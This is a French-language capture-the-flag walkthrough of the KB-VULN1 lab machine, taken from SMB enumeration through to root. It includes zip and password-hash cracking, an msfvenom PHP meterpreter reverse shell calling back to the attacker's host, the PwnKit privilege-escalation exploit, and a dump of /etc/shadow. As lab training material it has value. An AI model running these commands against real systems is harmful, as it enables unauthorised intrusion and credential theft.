# KB-VULN1
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.53
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.53...100%
[+] Scan Nmap 192.168.56.53...100%
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.53-tcp.html        |
==========================================================
```

&nbsp;

🐧 **Enum4linux**

```
==================( Users on 192.168.56.53 via RID cycling (RIDS: 500-550,1000-1050) )==================

S-1-22-1-1000 Unix User\heisenberg (Local User)

```

&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Voir les `shares` accessible

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $nxc smb 192.168.56.53 -u '' -p '' --shares
SMB         192.168.56.53   445    KB-SERVER        [*] Unix - Samba (name:KB-SERVER) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.56.53   445    KB-SERVER        [+] \: (Guest)
SMB         192.168.56.53   445    KB-SERVER        [*] Enumerated shares
SMB         192.168.56.53   445    KB-SERVER        Share           Permissions     Remark
SMB         192.168.56.53   445    KB-SERVER        -----           -----------     ------
SMB         192.168.56.53   445    KB-SERVER        Files           READ,WRITE      HACK ME
SMB         192.168.56.53   445    KB-SERVER        IPC$                            IPC Service (Samba 4.7.6-Ubuntu)

```

&nbsp;

Module `spider_plus` pour voir le contenu du shares

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $nxc smb 192.168.56.53 -u '' -p '' -M spider_plus
SMB         192.168.56.53   445    KB-SERVER        [*] Unix - Samba (name:KB-SERVER) (domain:) (signing:False) (SMBv1:True)
SMB         192.168.56.53   445    KB-SERVER        [+] \: (Guest)
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*]     STATS_FLAG: True
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         192.168.56.53   445    KB-SERVER        [*] Enumerated shares
SMB         192.168.56.53   445    KB-SERVER        Share           Permissions     Remark
SMB         192.168.56.53   445    KB-SERVER        -----           -----------     ------
SMB         192.168.56.53   445    KB-SERVER        Files           READ,WRITE      HACK ME
SMB         192.168.56.53   445    KB-SERVER        IPC$                            IPC Service (Samba 4.7.6-Ubuntu)
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/192.168.56.53.json".
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] SMB Shares:           2 (Files, IPC$)
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] SMB Readable Shares:  1 (Files)
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] SMB Writable Shares:  1 (Files)
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] Total folders found:  0
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] Total files found:    1
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] File size average:    37.13 MB
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] File size min:        37.13 MB
SPIDER_PLUS 192.168.56.53   445    KB-SERVER        [*] File size max:        37.13 MB

```

&nbsp;

Contenu du share

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $cat /tmp/nxc_hosted/nxc_spider_plus/192.168.56.53.json
{
    "Files": {
        "website.zip": {
            "atime_epoch": "2020-10-02 20:11:40",
            "ctime_epoch": "2020-10-02 20:11:40",
            "mtime_epoch": "2020-10-02 20:11:41",
            "size": "37.13 MB"
        }
    }
```

&nbsp;

**🖧 SMBclient**

Se connecter au `shares` pour télécharger le fichier en question

```
┌──[parrot@parrot]─[~/Desktop]
└──╼ $smbclient //192.168.56.53/Files
Password for [WORKGROUP\parrot]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan 17 12:53:41 2025
  ..                                  D        0  Fri Oct  2 19:12:00 2020
  website.zip                         N 38936127  Fri Oct  2 20:11:41 2020

        14380040 blocks of size 1024. 9539876 blocks available
smb: \> get website.zip
getting file \website.zip of size 38936127 as website.zip (89678,2 KiloBytes/sec) (average 89678,2 KiloBytes/sec)
smb: \> 
```

&nbsp;

Unzip

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $unzip website.zip
Archive:  website.zip
[website.zip] README.txt password: 
```

&nbsp;

**<span style="color: #dddddd;">💣</span> Zip2john**

Récupère le hash

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $zip2john website.zip

website.zip:$pkzip$8*1*1*0*8*24*86ae*3972b8474b6678a98eb7933c219b37e3720c81f752bf95ea032123c7fa31c58e029d959c*1*0*8*24*86af*1d663b483e4a2c2c264755306dc7ef2ea00ed524c640051e2ff5a90e3c5b0f0a73a13eaf*1*0*8*24*86ae*8745ccc88672aa84b147a13da555ec060745604a1fbcb560d3d42f53ec5b6e5d8d7be78f*1*0*0*24*86ae*ae0fc9c9c9ccff8014dc407238602fc3ef54ed81fee7bce296c008d7760ae199d5bca233*1*0*8*24*86af*e99d3c81237cdfd9465f04d4f45bcb902232deb52dd8410ae8a1d741ba8ea340c448bef7*1*0*8*24*86af*033746b88eafdf6cb9c5a676c45b4a44a1ea489241cf6044b352e73bd9f5b686263a7168*1*0*8*24*86af*503a81f7a18ae35d94730c631a0302b1c39e369cce211754fc76a13e2da31a6ba379c2f3*2*0*2e*2b*dc88feb8*cedf3*7b*8*2e*86ae*21482eb5e10e5270c5a6f4d74cd913be6b26bfec5f706b3218ec2e8b6bae5ab37f73df826602a9b530029b635e4f*$/pkzip$
```

&nbsp;

**<span style="color: #dddddd;">🧨</span> JohnTheRipper**

Crack du hash

```
┌──[parrot@parrot]─[~/Desktop]
└──╼ $john zip-hash --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
porchman         (website.zip)     
1g 0:00:00:00 DONE (2025-01-17 13:01) 1.020g/s 4657Kp/s 4657Kc/s 4657KC/s porcinet2005..porchea3
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john --show zip-hash 
website.zip:porchman

1 password hash cracked, 0 left
```

&nbsp;

Recherche de `user` & `password`

```
┌──[parrot@parrot]─[~/Desktop/sitemagic]
└──╼ $cat config.xml.php | grep Username
    <entry key="Username" value="admin"/>
┌─[parrot@parrot]─[~/Desktop/sitemagic]
└──╼ $cat config.xml.php | grep Password
    <entry key="Password" value="jesse"/>

```

&nbsp;

Panel d’authentification

![Capture du 2025-01-17 22-01-47](https://github.com/user-attachments/assets/ee875ac3-0fe8-4270-851a-d14cc0c2c17d)

&nbsp;

Upload de fichier

![Capture du 2025-01-17 22-02-30](https://github.com/user-attachments/assets/8fb6833c-a7ca-4145-992b-02b228e165a6)

&nbsp;

<span style="color: #dddddd;"><span style="color: #dddddd;">👻</span></span> **MSFvenom**

Création d’un reverse-shell

```
┌──[parrot@parrot]─[~/Desktop]
└──╼ $msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 --platform php -f raw -o rev.php
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1115 bytes
Saved as: rev.php
```

&nbsp;

Upload du reverse-shell

![Capture du 2025-01-17 22-14-22](https://github.com/user-attachments/assets/4f9bdaae-c0e3-4f72-8a98-857b02dfc03f)

Exécution du reverse-shell

![Capture du 2025-01-17 22-15-32](https://github.com/user-attachments/assets/b7a19878-2a24-43f2-a5d2-ddcde3bf6418)

&nbsp;

<span style="color: #dddddd;">💥</span> **Metasploit**

Ecoute sur le port `4444` du reverse-shell

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 192.168.56.104
lhost => 192.168.56.104
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set verbose true
verbose => true
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Sending stage (40004 bytes) to 192.168.56.53
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.53:59746) at 2025-01-17 22:12:13 +0100

(Meterpreter 1)(/var/www/html/sitemagic/files/images) > 
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Upload du script bash

```
(Meterpreter 1)(/var/www/html/sitemagic/files/images) > upload /usr/share/peass/linpeas/linpeas.sh
[*] Uploading  : /usr/share/peass/linpeas/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 828.43 KiB (0.0%): /usr/share/peass/linpeas/linpeas.sh -> linpeas.sh
[*] Completed  : /usr/share/peass/linpeas/linpeas.sh -> linpeas.sh
```

&nbsp;

Exécution de linpeas a la recherche d’élévation de privilège

```
Meterpreter 1)(/var/www/html/sitemagic/files/images) > shell
Process 1272 created.
Channel 1 created.
bash -i
bash: cannot set terminal process group (1097): Inappropriate ioctl for device
bash: no job control in this shell
www-data@kb-server:/var/www/html/sitemagic/files/images$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

**<span style="color: #dddddd;">💀</span> Exploit Pwnkit**

Upload de l’exploit & ajout des droits pour l’exécution

```
(Meterpreter 1)(/var/www/html/sitemagic/files/images) > upload /home/parrot/Desktop/PwnKit
[*] Uploading  : /home/parrot/Desktop/PwnKit -> PwnKit
[*] Uploaded -1.00 B of 17.62 KiB (-0.01%): /home/parrot/Desktop/PwnKit -> PwnKit
[*] Completed  : /home/parrot/Desktop/PwnKit -> PwnKit
(Meterpreter 1)(/var/www/html/sitemagic/files/images) > shell
Process 1382 created.
Channel 2 created.
bash -i
www-data@kb-server:/var/www/html/sitemagic/files/images$ chmod +rwx PwnKit

```

&nbsp;

Exécution de l’exploit

```
www-data@kb-server:/var/www/html/sitemagic/files/images$ ./PwnKit                                                                    
./PwnKit
mesg: ttyname failed: Inappropriate ioctl for device
bash -i
bash: cannot set terminal process group (1097): Inappropriate ioctl for device
bash: no job control in this shell
root@kb-server:/var/www/html/sitemagic/files/images# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

&nbsp;

Dump des `hash` utilisateurs

```
root@kb-server:/var/www/html/sitemagic/files/images# cat /etc/shadow
cat /etc/shadow
root:*:18480:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18537:0:99999:7:::
heisenberg:$6$txq5sYQupBAEMo7V$LqF1/IL.c0.QgKgpnAA204Mi.fGTJ2kA3Rpv.RnLBHF/4ivvsj655Yx8kh3asuGtjObOO0KQ4jl5nIjIr.0Ad0:18537:0:99999:7:::
```

&nbsp;

🧨 **JohnTheRipper**

Crack du `hash` de l’utilisateur

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john kb-vuln1 --wordlist=/usr/share/wordlists/metasploit/password.lst            
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:07 29.48% (ETA: 23:09:27) 0g/s 3497p/s 3497c/s 3497C/s eukaryote..expatriation
methamphetamine  (heisenberg)     
1g 0:00:00:13 DONE (2025-01-17 23:09) 0.07315g/s 3558p/s 3558c/s 3558C/s melmoth..mexican
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[windows@windows]─[~/Desktop]
└──╼ $john --show kb-vuln1 
heisenberg:methamphetamine:18537:0:99999:7:::

1 password hash cracked, 0 left
```

&nbsp;

Cred trouver

| User | Password |
| --- | --- |
| heisenberg | methamphetamine |
